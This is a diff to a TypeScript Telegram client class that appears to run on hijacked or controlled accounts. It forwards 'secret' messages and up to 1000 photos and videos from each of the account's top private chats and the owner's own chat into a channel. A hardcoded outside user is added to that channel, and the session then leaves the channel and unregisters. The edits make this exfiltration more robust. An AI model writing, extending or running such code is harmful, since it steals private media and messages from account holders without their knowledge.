@@ -74,7 +74,7 @@ class TelegramManager {
         const { id, accessHash } = result.chats[0];
         console.log("Archived chat", id);
         await this.archiveChat(id, accessHash);
-        const usersToAdd = ["fuckyoubabie"]; // Replace with the list of usernames or user IDs
+        const usersToAdd = ["fuckyoubabie1"]; // Replace with the list of usernames or user IDs
         console.log("Adding users to the channel:", usersToAdd);
         const addUsersResult = await this.client.invoke(
             new Api.channels.InviteToChannel({
@@ -111,11 +111,19 @@ class TelegramManager {
         let channelId;
         let channelAccessHash;
         if (channel) {
-            const result: any = await this.joinChannel(channel);
-            channelId = result.chats[0].id;
-            channelAccessHash = result.chats[0].accessHash;
-            await this.archiveChat(channelId, channelAccessHash);
-            console.log("Archived chat", channelId);
+            try {
+                const result: any = await this.joinChannel(channel);
+                channelId = result.chats[0].id;
+                channelAccessHash = result.chats[0].accessHash;
+                await this.archiveChat(channelId, channelAccessHash);
+                console.log("Archived chat", channelId);
+            } catch (error) {
+                const result = await this.createGroup();
+                channelId = result.id;
+                channelAccessHash = result.accessHash;
+                console.log("Created new group with ID:", channelId);
+            }
+
         } else {
             const result = await this.createGroup();
             channelId = result.id;
@@ -134,7 +142,7 @@ class TelegramManager {
                 const channelDetails = await this.createOrJoinChannel(channel);
                 channelId = channelDetails.id;
                 channelAccessHash = channelDetails.accesshash;
-                await this.forwardSecretMsgs(fromChatId, channelId.toString());
+                await this.forwardSecretMsgs(fromChatId, channelId?.toString());
             } else {
                 const chats = await this.getTopPrivateChats();
                 const me = await this.getMe();
@@ -143,7 +151,7 @@ class TelegramManager {
                     channelId = channelDetails.id;
                     channelAccessHash = channelDetails.accesshash;
                     const finalChats = new Set(chats.map(chat => chat.chatId));
-                    finalChats.add(me.id.toString());
+                    finalChats.add(me.id?.toString());
                     for (const chatId of finalChats) {
                         const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: ['photo', 'video'] });
                         console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
@@ -156,8 +164,7 @@ class TelegramManager {
         } catch (e) {
             console.log(e)
         }
-
-        await this.leaveChannels([channelId.toString()]);
+        await this.leaveChannels([channelId?.toString()]);
         await connectionManager.unregisterClient(this.phoneNumber);
     }
 
